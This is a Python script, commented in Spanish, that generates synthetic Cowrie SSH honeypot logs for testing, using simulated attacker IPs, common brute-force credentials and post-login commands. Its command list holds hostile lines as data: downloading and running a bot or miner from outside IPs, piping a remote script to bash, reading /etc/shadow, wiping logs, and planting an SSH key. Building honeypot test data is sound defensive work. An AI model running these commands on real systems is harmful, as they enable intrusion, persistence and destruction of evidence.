#!/usr/bin/env python3
"""
Genera logs de ejemplo en formato Cowrie JSON para pruebas.
Los eventos imitan el formato real de cowrie.json.
"""

import json
import random
import uuid
from datetime import datetime, timedelta

OUTPUT = "sample_cowrie.json"
NUM_SESSIONS = 500
START_DATE = datetime(2026, 9, 10, 0, 0, 0)
END_DATE = datetime(2026, 9, 30, 23, 59, 59)

# IPs atacantes simuladas (distribución realista: unas pocas muy activas)
ATTACKER_IPS = {
    # Muy activas
    "185.220.101.34": 120,
    "45.148.10.22": 95,
    "103.237.144.11": 80,
    "218.92.0.190": 70,
    "61.177.172.13": 60,
    # Moderadas
    "192.168.1.100": 25,   # IP local (ataque controlado desde Kali)
    "89.248.163.200": 20,
    "141.98.11.70": 18,
    "178.128.95.42": 15,
    "49.88.112.71": 12,
    # Esporádicas
    "5.188.206.14": 5,
    "112.85.42.88": 4,
    "222.186.180.17": 3,
    "43.153.96.21": 2,
    "91.240.118.50": 1,
}

# Credenciales más comunes en ataques SSH reales
USERNAMES = [
    ("root", 0.45), ("admin", 0.15), ("test", 0.06), ("user", 0.05),
    ("ubuntu", 0.04), ("oracle", 0.03), ("guest", 0.03), ("pi", 0.02),
    ("postgres", 0.02), ("mysql", 0.02), ("ftpuser", 0.02), ("www", 0.01),
    ("deploy", 0.01), ("git", 0.01), ("nginx", 0.01), ("hadoop", 0.01),
    ("tomcat", 0.01), ("jenkins", 0.01), ("docker", 0.01), ("redis", 0.01),
    ("elasticsearch", 0.005), ("nagios", 0.005),
]

PASSWORDS = [
    ("123456", 0.12), ("password", 0.08), ("admin", 0.07), ("root", 0.06),
    ("123456789", 0.05), ("12345", 0.04), ("1234", 0.04), ("admin123", 0.04),
    ("test", 0.03), ("pass", 0.03), ("toor", 0.03), ("qwerty", 0.03),
    ("password123", 0.03), ("1q2w3e4r", 0.02), ("letmein", 0.02),
    ("abc123", 0.02), ("master", 0.02), ("111111", 0.02), ("dragon", 0.02),
    ("welcome", 0.02), ("monkey", 0.01), ("login", 0.01), ("p@ssw0rd", 0.01),
    ("changeme", 0.01), ("default", 0.01), ("server", 0.01),
    ("Passw0rd!", 0.01), ("administrator", 0.01),
]

# Comandos que ejecutan los bots tras acceder
COMMANDS = [
    ("uname -a", 0.18),
    ("cat /etc/passwd", 0.10),
    ("whoami", 0.09),
    ("id", 0.07),
    ("cat /proc/cpuinfo", 0.06),
    ("free -m", 0.05),
    ("w", 0.04),
    ("ls -la /tmp", 0.04),
    ("cd /tmp", 0.04),
    ("wget http://45.148.10.22/bins/bot.x86 -O /tmp/bot", 0.05),
    ("curl http://103.237.144.11/scan.sh | bash", 0.04),
    ("chmod +x /tmp/bot", 0.03),
    ("/tmp/bot", 0.03),
    ("crontab -l", 0.03),
    ("cat /etc/shadow", 0.03),
    ("history -c", 0.02),
    ("rm -rf /var/log/*", 0.02),
    ("nproc", 0.02),
    ("ifconfig", 0.02),
    ("curl http://89.248.163.200/miner.sh -o /tmp/miner.sh", 0.02),
    ("bash /tmp/miner.sh", 0.01),
    ("echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys", 0.01),
]

# URLs de descarga de malware
DOWNLOAD_URLS = [
    "http://45.148.10.22/bins/bot.x86",
    "http://45.148.10.22/bins/bot.arm",
    "http://45.148.10.22/bins/bot.mips",
    "http://103.237.144.11/scan.sh",
    "http://89.248.163.200/miner.sh",
    "http://185.220.101.34/payload.sh",
]


def weighted_choice(items):
    """Selecciona un elemento según pesos (lista de tuplas (valor, peso))."""
    values, weights = zip(*items)
    return random.choices(values, weights=weights, k=1)[0]


def random_ts(start, end):
    """Genera un timestamp aleatorio entre dos fechas."""
    delta = end - start
    random_seconds = random.randint(0, int(delta.total_seconds()))
    dt = start + timedelta(seconds=random_seconds)
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def generate_session_id():
    return uuid.uuid4().hex[:12]


def main():
    events = []
    ips = list(ATTACKER_IPS.keys())
    ip_weights = list(ATTACKER_IPS.values())

    for _ in range(NUM_SESSIONS):
        src_ip = random.choices(ips, weights=ip_weights, k=1)[0]
        src_port = random.randint(1024, 65535)
        session_id = generate_session_id()
        ts_base = random_ts(START_DATE, END_DATE)

        # Evento de conexión
        events.append({
            "eventid": "cowrie.session.connect",
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": "140.238.167.42",
            "dst_port": 2222,
            "session": session_id,
            "protocol": "ssh",
            "timestamp": ts_base,
            "sensor": "cowrie-honeypot",
        })

        # Intentos de login (1 a 8 por sesión)
        num_attempts = random.randint(1, 8)
        login_success = False

        for j in range(num_attempts):
            username = weighted_choice(USERNAMES)
            password = weighted_choice(PASSWORDS)
            # ~15% de éxito (Cowrie deja entrar con ciertas credenciales)
            success = random.random() < 0.15

            events.append({
                "eventid": "cowrie.login.success" if success else "cowrie.login.failed",
                "username": username,
                "password": password,
                "src_ip": src_ip,
                "session": session_id,
                "timestamp": ts_base,
                "sensor": "cowrie-honeypot",
            })

            if success:
                login_success = True
                break

        # Si hubo acceso, ejecutar comandos
        if login_success:
            num_cmds = random.randint(1, 10)
            for k in range(num_cmds):
                cmd = weighted_choice(COMMANDS)
                events.append({
                    "eventid": "cowrie.command.input",
                    "input": cmd,
                    "src_ip": src_ip,
                    "session": session_id,
                    "timestamp": ts_base,
                    "sensor": "cowrie-honeypot",
                })

            # ~30% de sesiones exitosas intentan descargar algo
            if random.random() < 0.30:
                url = random.choice(DOWNLOAD_URLS)
                sha = uuid.uuid4().hex
                events.append({
                    "eventid": "cowrie.session.file_download",
                    "url": url,
                    "shasum": sha,
                    "src_ip": src_ip,
                    "session": session_id,
                    "timestamp": ts_base,
                    "sensor": "cowrie-honeypot",
                    "outfile": f"var/lib/cowrie/downloads/{sha}",
                })

        # Evento de desconexión
        events.append({
            "eventid": "cowrie.session.closed",
            "src_ip": src_ip,
            "session": session_id,
            "timestamp": ts_base,
            "duration": round(random.uniform(0.5, 120.0), 2),
            "sensor": "cowrie-honeypot",
        })

    # Ordenar por timestamp
    events.sort(key=lambda e: e["timestamp"])

    with open(OUTPUT, "w", encoding="utf-8") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")

    print(f"Generados {len(events)} eventos en {OUTPUT}")
    print(f"Sesiones: {NUM_SESSIONS}")
    print(f"Periodo: {START_DATE.date()} a {END_DATE.date()}")


if __name__ == "__main__":
    main()
